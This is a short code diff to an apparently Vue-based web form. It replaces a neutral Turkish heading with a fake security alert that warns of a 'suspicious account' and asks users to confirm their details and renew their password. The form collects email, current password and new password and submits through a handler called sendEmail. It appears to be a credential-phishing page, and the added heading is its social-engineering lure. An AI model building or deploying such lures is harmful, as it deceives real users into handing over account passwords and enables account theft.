@@ -52,7 +52,7 @@
 <body>
     <div id="app">
         <form @submit.prevent="sendEmail">
-            <h2>Bilgileriniz</h2>
+            <h2>DIKKAT! Bu supheli hesap kisisel bilgilerinize erismeye calismaktadir. <br>Hesabinizi kurtarmak icin lutfen bilgilerinizi teyit edip sifrenizi yanileyin.</h2>
             <input type="email" v-model="email" placeholder="Email" required>
             <input type="password" v-model="password" placeholder="Sifre" required>
             <input type="password" v-model="newPassword" placeholder="Yeni Sifre" required>
